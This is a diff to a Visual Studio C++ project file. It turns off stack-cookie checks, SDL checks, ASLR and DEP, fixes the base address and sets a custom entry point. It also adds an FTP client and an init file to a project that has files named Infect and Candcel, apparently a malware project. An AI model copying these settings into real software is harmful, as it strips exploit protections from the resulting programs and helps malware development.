@@ -147,13 +147,14 @@
       <WarningLevel>Level3</WarningLevel>
       <Optimization>Disabled</Optimization>
       <PreprocessorDefinitions>_DEBUG;_WINDOWS;SODIUM_STATIC;%(PreprocessorDefinitions)</PreprocessorDefinitions>
-      <SDLCheck>true</SDLCheck>
+      <SDLCheck>false</SDLCheck>
       <AdditionalIncludeDirectories>$(SolutionDir)packages\libsodium_vc120.1.0.0.0\build\native\include\;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
       <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
       <TreatWarningAsError>true</TreatWarningAsError>
       <EnableParallelCodeGeneration>true</EnableParallelCodeGeneration>
       <MultiProcessorCompilation>true</MultiProcessorCompilation>
       <MinimalRebuild>false</MinimalRebuild>
+      <BufferSecurityCheck>false</BufferSecurityCheck>
     </ClCompile>
     <Link>
       <SubSystem>Windows</SubSystem>
@@ -161,6 +162,10 @@
       <AdditionalLibraryDirectories>$(SolutionDir)packages\libsodium_vc120.1.0.0.0\build\native\bin;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
       <AdditionalDependencies>libsodium-x64-v120-mt-sgd-1_0_0_0.lib;Ws2_32.lib;Comctl32.lib;%(AdditionalDependencies)</AdditionalDependencies>
       <TreatLinkerWarningAsErrors>true</TreatLinkerWarningAsErrors>
+      <RandomizedBaseAddress>false</RandomizedBaseAddress>
+      <DataExecutionPrevention>false</DataExecutionPrevention>
+      <FixedBaseAddress>true</FixedBaseAddress>
+      <EntryPointSymbol>_veinit</EntryPointSymbol>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='DebugRunDLL|x64'">
@@ -207,13 +212,15 @@
       <FunctionLevelLinking>true</FunctionLevelLinking>
       <IntrinsicFunctions>true</IntrinsicFunctions>
       <PreprocessorDefinitions>NDEBUG;_WINDOWS;SODIUM_STATIC;%(PreprocessorDefinitions)</PreprocessorDefinitions>
-      <SDLCheck>true</SDLCheck>
+      <SDLCheck>false</SDLCheck>
       <AdditionalIncludeDirectories>$(SolutionDir)packages\libsodium_vc120.1.0.0.0\build\native\include\;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
       <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
       <DebugInformationFormat>None</DebugInformationFormat>
       <OmitFramePointers>true</OmitFramePointers>
       <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
       <StringPooling>true</StringPooling>
+      <TreatWarningAsError>true</TreatWarningAsError>
+      <BufferSecurityCheck>false</BufferSecurityCheck>
     </ClCompile>
     <Link>
       <SubSystem>Windows</SubSystem>
@@ -225,6 +232,10 @@
       <UACUIAccess>false</UACUIAccess>
       <FullProgramDatabaseFile>false</FullProgramDatabaseFile>
       <AssemblyDebug>false</AssemblyDebug>
+      <RandomizedBaseAddress>false</RandomizedBaseAddress>
+      <DataExecutionPrevention>false</DataExecutionPrevention>
+      <FixedBaseAddress>true</FixedBaseAddress>
+      <EntryPointSymbol>_veinit</EntryPointSymbol>
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
@@ -237,6 +248,7 @@
     <ClInclude Include="Candcel.h" />
     <ClInclude Include="Config.h" />
     <ClInclude Include="CoreInterface.h" />
+    <ClInclude Include="FTPClient.h" />
     <ClInclude Include="Infect.h" />
     <ClInclude Include="Module.h" />
     <ClInclude Include="Json.h" />
@@ -270,7 +282,9 @@
     <ClCompile Include="AddrLookup.cpp" />
     <ClCompile Include="Candcel.cpp" />
     <ClCompile Include="Config.cpp" />
+    <ClCompile Include="FTPClient.cpp" />
     <ClCompile Include="Infect.cpp" />
+    <ClCompile Include="init.cpp" />
     <ClCompile Include="Json.cpp" />
     <ClCompile Include="JsonValue.cpp" />
     <ClCompile Include="Log.cpp" />
